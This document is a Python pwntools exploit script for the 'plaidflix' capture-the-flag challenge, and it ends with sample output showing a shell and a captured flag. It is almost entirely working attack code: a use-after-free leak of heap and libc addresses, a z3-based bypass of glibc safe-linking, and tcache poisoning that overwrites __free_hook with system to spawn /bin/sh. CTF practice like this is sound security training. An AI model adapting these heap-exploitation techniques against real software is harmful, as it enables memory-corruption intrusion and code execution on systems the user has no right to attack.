"""
"""
from pwn import *
import time
import ctypes


context.update(arch="amd64", os="linux", bits=64)

from z3 import *

def unsafe_link(e):
    """
    Decodes a given safe link into its original pointer
    """
    high_e = e & 0xfffffff000000000

    x = BitVec('x',64)
    s = Solver()
    s.add(x & 0xfffffff000000000 == high_e)
    s.add(x ^ (x >> 12) == e)
    s.check()
    return s.model()[x].as_long()


gdbscript = '''
continue
'''.format(**locals())

def start(exe, argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def delete_account():
    """
    Exploits bug in feedback
    """
    # choose to "delete account"
    io.sendafter('>', '2\n')
    io.sendafter('>', 'y\n')


    def add_feedback(feedback):
        io.sendafter('>', '0\n')
        try:
            io.sendafter('>', feedback+'\n')
        except TypeError:
            io.sendafter('>', feedback+b'\n')
    def delete_feedback(idx):
        io.sendafter('>', '1\n')
        n = str(idx)
        io.sendafter('>', n+'\n')
    def add_contact(data):
        io.sendafter('>', '2\n')
        io.sendafter('>', data+b'\n')
    def submit_feedback():
        io.sendafter('>', '3\n')


    # create 7 feedback to fill tcache
    for i in range(7):
        feedback = chr(i)*0x100
        add_feedback(feedback)      # feedback chunks 0-6
    # create 2 feedback for consolidation shenanigans
    for i in range(2):
        feedback = chr(7+i)*0x100
        add_feedback(feedback)      # feedback chunks 7-8


    # fill 0x110 tcache => 0-6,8
    for i in range(6):
        delete_feedback(i)
    # chunk to overflow
    delete_feedback(8)

    # free chunk, moving it to unsorted bin
    #   - chunk size here is 0x110 after
    delete_feedback(7)
    # free chunk above #7, moving it to unsorted bin and triggering consolidation with #7
    #   - chunk size here is 0x220 after consolidation
    delete_feedback(6)


    ## Add contact details to create a chunk of size 0x130
    #   - This data is stored at the unsorted bin from #6 feedback chunk

    # Since we are writing 0x120 bytes here, we are overflowing the previous #7 chunk header by 0x20
    #   - We modify can #7.. this would be useful if #7 was in a tcache bin..
    prev_size = 0
    chunk_size = 0x111
    flink = 0x4242424242424242
    blink = 0x4343434343434343
    chunk = p64(prev_size) + p64(chunk_size) + p64(flink) + p64(blink)
    contact = b"X"*(0x120 - len(chunk)) + chunk
    add_contact(contact)
    # the unsorted bin is now size 0xf0 and located at feedback chunk #7 + 0x20


    ## clear tcache by creating 7 feedback
    # first value is previous #8, currently located after the unsorted chunk
    #   - set a new prev_size here for unsorted (0x1f0) so we can overflow this feedback's chunk header
    feedback = p64(0x1f0) + p64(0x110)
    feedback = b'\x55'*(0x100-len(feedback)) + feedback
    add_feedback(feedback)    # feedback chunk 0
    for i in range(1,7):
        feedback = chr(i)*0x100
        add_feedback(feedback)      # feedback chunks 1-6

    # push feedback #7 onto tcache
    delete_feedback(7)


    ## pop #7 off tcache to overwrite the unsorted chunk located at starting at offset 0x10
    # unsure of unsorted bin checks here, might be able to add something else intead for another exploit path?
    unsorted_chunk  = p64(0) + p64(0x1f0)
    unsorted_chunk  += p64(main_area_ptr) + p64(main_area_ptr)
    feedback  = b'A'*0x10
    feedback += unsorted_chunk
    feedback += b"A"*(0x100-len(feedback))
    add_feedback(feedback)      # feedback chunk 7
    # the unsorted bin is now size 0x1f0


    ## Groom the heap so that #0 is in tcache when we overwrite it using the unsorted chunk
    # obtain the modified unsorted chunk
    feedback = "B"
    add_feedback(feedback)      # feedback chunk 8

    # create another to sort/flush the unsorted bin entry
    add_feedback(feedback)      # feedback chunk 9

    # free 2 values to allow us to create more feedback
    delete_feedback(2)
    delete_feedback(1)

    # push #0 onto tcache bin
    delete_feedback(0)

    # free #8 to re-write
    delete_feedback(8)


    ## pop #8 from tcache back and overwrite tcache entry (previous #0)
    #   - note: this new feedback is now the new #0
    hook = free_hook
    # hack to "safe link" our pointer
    hook = (hook ^ (heap_base >> 12)) + 1
    chunk  = p64(0) + p64(0x110)
    chunk += p64(hook)  + p64(hook)
    feedback = b"B"*(0x100-len(chunk)) + chunk
    add_feedback(feedback)      # feedback chunk 0

    # pop previous #0 off and write command
    feedback = '/bin/sh\x00'
    add_feedback(feedback)      # feedback chunk 1
    # pop free_hook off and write address of system
    feedback = p64(system_addr) + p64(system_addr)
    add_feedback(feedback)      # feedback chunk 2

    # trigger system("/bin/sh")
    delete_feedback(1)


def add_movie(title, rating):
    io.sendafter('>', '0\n')
    io.sendafter('>', '0\n')
    io.sendafter('>', title+'\n')
    io.sendafter('>', str(rating)+'\n')
def remove_movie(movie_id):
    io.sendafter('>', '0\n')
    io.sendafter('>', '1\n')
    io.sendafter('>', str(movie_id)+'\n')
def show_movie():
    io.sendafter('>', '0\n')
    io.sendafter('>', '2\n')
    r = io.recvuntil('What do')
    s0 = b'movies:'
    s1 = b'What do'
    r = r[r.find(s0)+len(s0):]
    r = r[:r.find(s1)]
    r = r.rstrip(b'\n').lstrip(b'\n')
    return r
def share_movie(movie_id, friend_id):
    io.sendafter('>', '0\n')
    io.sendafter('>', '3\n')
    io.sendafter('>', str(movie_id)+'\n')
    io.sendafter('>', str(friend_id)+'\n')

def add_friend(length, name):
    io.sendafter('>', '1\n')
    io.sendafter('>', '0\n')
    io.sendafter('>', str(length)+'\n')
    io.sendafter('>', name+'\n')
def remove_friend(friend_id):
    io.sendafter('>', '1\n')
    io.sendafter('>', '1\n')
    io.sendafter('>', str(friend_id)+'\n')
def show_friend():
    io.sendafter('>', '1\n')
    io.sendafter('>', '2\n')
    r = io.recvuntil('What do')
    s0 = b'friends:'
    s1 = b'What do'
    r = r[r.find(s0)+len(s0):]
    r = r[:r.find(s1)]
    r = r.rstrip(b'\n').lstrip(b'\n')
    return r

if __name__ == "__main__":
    binary_path = "./challenge/bin/plaidflix"
    host = "plaidflix.pwni.ng"
    port = 1337

    elf = ELF(binary_path)
    if args.LOCAL:
        if args.TEST:
            # debugging locally to view bins, pwndbg doesn't currently support safe link
            binary_path = './challenge/bin/plaidflix'
            io = start(binary_path)
        else:
            # running this locally with Docker
            io = remote('127.0.0.1', 9001)
    else:
        io = remote(host, port)

    name = 'a'*0x64 + '\n'
    io.sendafter('name?\n>', name)


    ## Get heap leak and libc leak via UAF in movie listing

    # add friends with min length name
    name = "A"
    length = len(name)
    N = 2
    for i in range(N):
        add_friend(length, name)

    # add a new movie and add 2nd friend
    #   - once this friend is freed, it will hold heap pointers from for the tcache list
    add_movie('m0', 1)
    share_movie(0,1)

    # remove friends, pushing them into tcache
    for i in range(N):
        remove_friend(i)

    # add 8 friends with a different length
    name = "A"*0x7f
    length = len(name)
    for i in range(8):
        # dont really need to write a name, so empty name
        add_friend(length, '')

    # add a new movie and add the 8th friend
    #   - by the time this friend is freed, the tcache bin will be filled so it is pushed to the unsorted bin
    #   - because of this, its forward and back pointers will be libc pointers
    #       - for 20.10, we appeared to need this to sort into a small bin before it would container libc references
    add_movie('m1', 1)
    share_movie(1,7)

    # remove all friends
    #   - fills tcache and places 8th friend into unsorted bin
    for i in range(8):
        remove_friend(i)

    # obtain a new friend to trigger the unsorted bin to push the previous friend into a small bin list
    name = "A"*0x8f
    length = len(name)
    for i in range(1):
        add_friend(length, '')

    # show movie to trigger UAF, printing the contents of freed friend chunks
    r = show_movie().split(b'\n')

    # parse out heap leak
    s = b'with: '
    leak = r[2]
    leak = leak[leak.find(s) + len(s):]
    leak = leak + b'\x00'*(8-len(leak))
    heap_leak = u64(leak)

    # new security feature: safe link
    #   - we get around this using z3 SMT solver to decode it
    heap_leak = unsafe_link(heap_leak)
    heap_base = heap_leak & ~0xfff
    print("heap_leak:", hex(heap_leak))
    print("heap_base:", hex(heap_base))

    # parse out libc leak
    leak = r[5]
    leak = leak[leak.find(s) + len(s):]
    leak = leak + b'\x00'*(8-len(leak))
    libc_leak = u64(leak)
    libc_base = libc_leak - 0x1e3c80
    main_area_ptr = libc_leak - 0x80
    free_hook = libc_base + 0x1e6e40
    system_addr = libc_base + 0x503c0
    print("libc_leak:", hex(libc_leak))
    print("libc_base:", hex(libc_base))
    print("free_hook:", hex(free_hook))

    ## switch to feedback exploit
    delete_account()

    io.interactive()
    io.close()

"""
[+] Opening connection to plaidflix.pwni.ng on port 1337: Done
heap_leak: 0x55a77e6b62c0
heap_base: 0x55a77e6b6000
libc_leak: 0x7feb0d18fc80
libc_base: 0x7feb0cfac000
free_hook: 0x7feb0d192e40
[*] Switching to interactive mode
 $ cat flag.txt
PCTF{N0w_YOu_Kn0w_S4f3_L1nk1ng!}
"""
